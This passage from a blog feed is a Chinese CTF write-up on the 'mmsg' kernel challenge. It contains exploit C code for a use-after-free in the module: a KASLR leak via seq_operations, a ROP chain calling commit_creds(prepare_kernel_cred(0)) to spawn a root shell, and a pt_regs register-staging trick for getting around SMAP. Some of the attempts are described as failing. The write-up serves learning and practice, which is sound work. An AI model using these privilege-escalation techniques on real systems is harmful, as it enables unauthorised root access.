<li><a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^ 3CTF2023 d3kcache 出题手记 - arttnba3’s blog</a></li>
<li><a href="https://blog.xmcve.com/2023/11/12/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023-Writeup/#title-8">星盟：强网拟态2023 Writeup</a></li>
<li><a href="https://mp.weixin.qq.com/s/Ls-PQ3VtVRiKRXwHWTQIwA">DJB：2023强网拟态预赛 WP</a></li>
<li><a href="https://mp.weixin.qq.com/s/3vaT1gJBagSjovJZNZaR-g">El3ctronic：第六届“强网”拟态</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>peekgeek mmsg</title>
    <url>/2023/07/28/peekgeek%20mmsg/</url>
    <content><![CDATA[<blockquote>
<p>做题踩坑实录，赛后复现.</p>
</blockquote>
<span id="more"></span>

<h2 id="step1-init"><a href="#step1-init" class="headerlink" title="step1: init"></a>step1: init</h2><ul>
<li>拿到附件，查看启动脚本，smep, smap, kaslr，应该还有pti</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -cpu host,+smep,+smap \</span><br><span class="line">        -smp cores=1 \</span><br><span class="line">        -kernel bzImage \</span><br><span class="line">        -hda rootfs.img \</span><br><span class="line">        -nographic \</span><br><span class="line">        -monitor none \</span><br><span class="line">        -snapshot \</span><br><span class="line">        -enable-kvm \</span><br><span class="line">        -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw kaslr rdinit=/sbin/init  quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">        -no-reboot</span><br></pre></td></tr></table></figure>

<ul>
<li>ext4 镜像挂载</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> rootfs</span><br><span class="line"></span><br><span class="line">sudo mount rootfs.img ./rootfs</span><br></pre></td></tr></table></figure>

<ul>
<li>查看init， etc&#x2F;init.d 下的文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R root:root /</span><br><span class="line"><span class="built_in">chmod</span> 700 /root</span><br><span class="line"><span class="built_in">chown</span> -R ctf:ctf /home/ctf</span><br><span class="line"><span class="built_in">chown</span> root:root /root/flag</span><br><span class="line"><span class="built_in">chmod</span> 600 /root/flag</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/kptr_restrict</span></span><br><span class="line"></span><br><span class="line">insmod /root/mmsg.ko</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/mmsg</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/ctf</span><br><span class="line"><span class="comment"># setsid cttyhack su ctf -c /bin/sh</span></span><br><span class="line">setsid cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="comment"># setsid cttyhack setuidgid 0 /bin/sh</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<ul>
<li>修改内容，将ko文件拷贝一份，etc&#x2F;init.d&#x2F;rcS内容修改一下，然后umount，启动。（修改效果生效必须要<strong>umount</strong>）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mount ./rootfs</span><br></pre></td></tr></table></figure>

<ul>
<li>内核版本 <code>5.10.186</code></li>
</ul>
<h2 id="step2-ko"><a href="#step2-ko" class="headerlink" title="step2: ko"></a>step2: ko</h2><ul>
<li>逆向分析ko文件（直接给出了c文件，也可以不看）。漏洞所在的地方，类似入门经典题目<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/uaf/">kernel UAF - CTF Wiki</a>。但是结构体大小0x20</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_head</span> *<span class="title">mmsg_head</span>;</span> </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">mmsg_device</span>;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> &#123;</span><br><span class="line">    kfree(mmsg_head);</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mmsg_module_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    mmsg_device.minor = MISC_DYNAMIC_MINOR;</span><br><span class="line">    mmsg_device.name = DEVICE_NAME;</span><br><span class="line">    mmsg_device.fops = &amp;module_fops;</span><br><span class="line">    misc_register(&amp;mmsg_device);</span><br><span class="line">    mmsg_head = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_head), GFP_KERNEL);</span><br><span class="line">    <span class="built_in">strncpy</span>(mmsg_head-&gt;description, DEVICE_NAME <span class="string">&quot;-mmsg_head&quot;</span>, <span class="number">15</span>);</span><br><span class="line">    INIT_LIST_HEAD(&amp;mmsg_head-&gt;<span class="built_in">list</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mmsg_module_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    misc_deregister(&amp;mmsg_device);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Goodbye, World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li></li>
</ul>
<h2 id="step3-exploit"><a href="#step3-exploit" class="headerlink" title="step3: exploit"></a>step3: exploit</h2><ul>
<li>尝试ROP，但是不太会🤡</li>
</ul>
<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>原文内容： <a href="https://n.ova.moe/blog/2023/03/18/_%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95">「PWN」内核 PWN 题目的第一次尝试</a></p>
<ul>
<li>像，很像呀。看了一下，发现及其类似，于是尝试使用类似的exp进行做</li>
<li>调试，找地址，先关闭kaslr，通过泄露获得offset</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  gcc exp.c -static -o exp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd1, fd2;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"><span class="type">size_t</span> buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *dev_name = <span class="string">&quot;/dev/mmsg&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel base =&gt;  cat /proc/kallsyms | grep startup_64</span></span><br><span class="line"><span class="type">size_t</span> kernel_base;</span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nokalr kernel base</span></span><br><span class="line"><span class="type">size_t</span> nokaslr = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cat /sys/module/mmsg/sections/.text</span></span><br><span class="line"><span class="comment"> * 0xffffffffc03f5000</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// close kaslr</span></span><br><span class="line"><span class="comment">// grep prepare_kernel_cred  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff9248d790</span>;</span><br><span class="line"><span class="comment">// grep commit_creds  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff9248d350</span>;</span><br><span class="line"><span class="comment">// grep swapgs_restore_regs_and_return_to_usermode  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff93000e30</span>;</span><br><span class="line"><span class="comment">//  grep native_write_cr4 /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> native_write_cr4 = <span class="number">0xffffffffa8832250</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ropper</span></span><br><span class="line"><span class="comment">// pop rdi; ret</span></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff812274dd</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82d63c0d: mov edi, eax; call rbx;</span></span><br><span class="line"><span class="comment">// 在 64 位环境下，目的寄存器若是 32 位，则会将高 32 位清零</span></span><br><span class="line"><span class="type">size_t</span> mov_edi_eax_call_rbx = <span class="number">0xffffffff82d63c0d</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82e6f708: pop rbx; ret; </span></span><br><span class="line"><span class="type">size_t</span> pop_rbx_ret = <span class="number">0xffffffff82e6f708</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> token;</span><br><span class="line">  <span class="type">int</span> top;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">new</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">recv_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">put_mmsg</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *addr)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  arg.data = addr;</span><br><span class="line">  ioctl(fd, <span class="number">0x5555555</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_mmsg</span><span class="params">(<span class="type">int</span> fd)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  arg.data = (<span class="type">char</span> *)buf;</span><br><span class="line">  ioctl(fd, <span class="number">0x6666666</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line"> <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">asm</span>(</span><br><span class="line">   <span class="string">&quot;movq %%cs, %0;&quot;</span></span><br><span class="line">   <span class="string">&quot;movq %%ss, %1;&quot;</span></span><br><span class="line">   <span class="string">&quot;movq %%rsp, %3;&quot;</span></span><br><span class="line">   <span class="string">&quot;pushfq;&quot;</span></span><br><span class="line">    <span class="string">&quot;pop %2;&quot;</span></span><br><span class="line">   : <span class="string">&quot;=r&quot;</span>(user_cs),<span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_rsp)</span><br><span class="line">   : </span><br><span class="line">      : <span class="string">&quot;memory&quot;</span></span><br><span class="line">   );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>( getuid() ) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> seq;</span><br><span class="line"> <span class="keyword">if</span> ( (seq=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) == <span class="number">-1</span>) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;[x] seq open fail&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uaf</span><span class="params">()</span> &#123;</span><br><span class="line">    fd1 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd2 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_base</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// read 操作，经过函数调用链则会最终调用 seq_operations-&gt;start 指针对应的函数</span></span><br><span class="line">    seq_fd = seq_open();</span><br><span class="line">    get_mmsg(fd2);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;buf[%d] =&gt; 0x%llx\n&quot;</span>, j, buf[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    kernel_base = buf[<span class="number">0</span>] - <span class="number">0x20fac0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel base =&gt; 0x%llx&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    kernel_offset = kernel_base - nokaslr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status(); </span><br><span class="line">    uaf();</span><br><span class="line">    leak_base();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>rop</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 之前的都一样</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> o(x) (x+kernel_offset)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// smep userspace地址被标记为non-executable</span></span><br><span class="line">    <span class="comment">// bypass: stack prviot</span></span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x40</span>];</span><br><span class="line">    <span class="type">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> user_rip = (<span class="type">size_t</span>)get_shell;</span><br><span class="line"></span><br><span class="line">    payload[idx++] = o(pop_rbx_ret);</span><br><span class="line">    payload[idx++] = o(commit_creds);</span><br><span class="line">    payload[idx++] = o(pop_rdi_ret); <span class="comment">// return address</span></span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = o(prepare_kernel_cred);</span><br><span class="line">    payload[idx++] = o(mov_edi_eax_call_rbx);</span><br><span class="line">    payload[idx++] = o(swapgs_restore_regs_and_return_to_usermode) + <span class="number">22</span>; </span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = user_rip;</span><br><span class="line">    payload[idx++] = user_cs;</span><br><span class="line">    payload[idx++] = user_rflags;</span><br><span class="line">    payload[idx++] = user_rsp;</span><br><span class="line">    payload[idx++] = user_ss;</span><br><span class="line">    </span><br><span class="line">    put_mmsg(fd2, (<span class="type">char</span> *)&amp;payload);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger seq_file-&gt;start</span></span><br><span class="line">    read(seq_fd, <span class="literal">NULL</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>使用xchg 进行类似栈迁移的操作，从而进行劫持函数执行流</p>
</li>
<li><p>在本地执行时，直接kernel panic。查看报错信息，发现是<code>can&#39;t access memory in 0x????(是个用户地址)</code>。</p>
</li>
</ul>
<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>后来看来一下这篇文章发现原因：<a href="https://blog.wingszeng.top/kernel-pwn-struct-seq-operations-and-struct-pt-regs/#%E4%BE%8B%E9%A2%98-2023-pwnhub-%E5%85%AC%E5%BC%80%E8%B5%9B-kheap">Kernel Pwn Struct seq_operations and Struct pt_regs</a></p>
<ul>
<li>这一题开启了smap，而 pwnhub 的那一题中没有。而smap: kernel space 不能 access user space 的东西。</li>
<li>这篇文章中说了一个 <code>pt_regs</code> 的结构体，在使用syscall 时，会将某些寄存器内容压入<code>内核栈的栈底</code>.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在系统调用的过程中, 不是所有的寄存器都会被改变, 比如 r8 - r15, 他们会在压入 pt_regs 的时保持 syscall 之前的值. 这就为我们提供了布置数据的可能性. 如果在仅能劫持 rip 的情况下 (比如上面介绍的 seq_operations), 跳转到某个形如 <code>add, rsp val; ret</code> 的 gadget, 那么就有可能将 rsp 设置到内核栈的 pt_regs 上, 从而执行我们布置的 ROP 链.</p>
</blockquote>
<ul>
<li><p>也就是我们 rop 往 内核栈的 pt_regs 中跳转，就不会绕过了smap</p>
</li>
<li><p>如何将寄存器压入: 使用了巧妙地方法，syscall 调用 read，将寄存器压入，并且可以通过seq_operations-&gt;start执行rop</p>
</li>
<li><p>调用模板+解释的比较详细的文章：<a href="https://ywhkkx.github.io/2023/02/19/seq_operations%20+%20pt_regs/">seq_operations+pt_regs</a></p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__asm__(  </span><br><span class="line">    <span class="string">&quot;mov r15, 0x55555555;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r14, 0x44444444;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r13, 0x33333333;&quot;</span>   </span><br><span class="line">    <span class="string">&quot;mov r12, 0x22222222;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rbp, 0xbbbb1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0xbbbb2222;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r11, 0x11111111;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r10, 0x11110000;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r9,  0x99999999;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r8,  0x88888888;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rcx, 0x666666;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;syscall&quot;</span>  </span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li>gadget: 改变rsp, add rsp, xxx; ret，进行栈迁移</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/2wi 0xffffffff81909b8c</span><br><span class="line">   0xffffffff81909b8c:  add    rsp,0x168</span><br><span class="line">   0xffffffff81909b93:  ret</span><br></pre></td></tr></table></figure>

<ul>
<li>但是我们需要事先知道执行start 时与pt_regs 距离多远。<ul>
<li>直接使用没有布局的脚本，自然会kernel panic，可以看到rip的内容，然后与上述的payload进行对比，获得偏移</li>
</ul>
</li>
<li>并且这并不是一个万能的方法</li>
</ul>
<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><ul>
<li>后来还是不对，因此再看参考文章，如下也存在uaf问题。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// module_ioctl</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_head</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> description[<span class="number">16</span>];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">case</span> MMSG_RECV: </span><br><span class="line">        <span class="keyword">if</span> (arg.top) &#123;</span><br><span class="line">            m = list_entry(&amp;mmsg_head-&gt;<span class="built_in">list</span>, <span class="keyword">struct</span> mmsg, <span class="built_in">list</span>);  <span class="comment">// head</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            m = find_mmsg(arg.token);   <span class="comment">// 遍历查询</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (m == <span class="literal">NULL</span> || arg.size &gt; m-&gt;size || arg.size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            ret = -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;mmsg recv\n&quot;</span>);</span><br><span class="line">        copy_to_user((<span class="type">void</span> __user *)arg.data, m-&gt;data, arg.size);</span><br><span class="line">        list_del(&amp;m-&gt;<span class="built_in">list</span>);  <span class="comment">// 双向链表元素内核提供的删除函数</span></span><br><span class="line">        kfree(m-&gt;data);      <span class="comment">// head 没有，但是固定偏移为 0x10 的地方，相当于free掉list，不会报错</span></span><br><span class="line">        kfree(m);          </span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><h4 id="偏移确定"><a href="#偏移确定" class="headerlink" title="偏移确定"></a>偏移确定</h4><ul>
<li><p>add rsp val，我们需要一个比较具体的值</p>
</li>
<li><p>大概是 <code>0x100+</code> 的gadget吧，不太会，但是此结构体大小大于0x100，并且要开启syscall的栈帧</p>
<ul>
<li>应该可以在ioctl 下断点，但是我失败了😥</li>
</ul>
</li>
</ul>
<h4 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h4><ul>
<li>直接看报错:  BUG: unable to handle page fault for address: 0000000044444444 ； RIP: 0010:0x44444444获得我们rip指针控制的寄存器 r14</li>
<li>syscall 不会改变 r8-r15内容。理想情况下r8-r15内容不变，但是可能会产生奇妙的变化。调试，si会走到start指针的操作，从而获得栈结构</li>
<li>假设理想化从r14-r8没有发生改变</li>
<li>si 一路走，但是看不到对应内容?</li>
</ul>
<p><a href="https://b0ldfrev.gitbook.io/note/linux_kernel/kernelpwn-zhuang-tai-qie-huan-yuan-li-ji-kpti-rao-guo#0x2-bypass-kpti">KERNEL_PWN状态切换原理及KPTI绕过</a></p>
<ul>
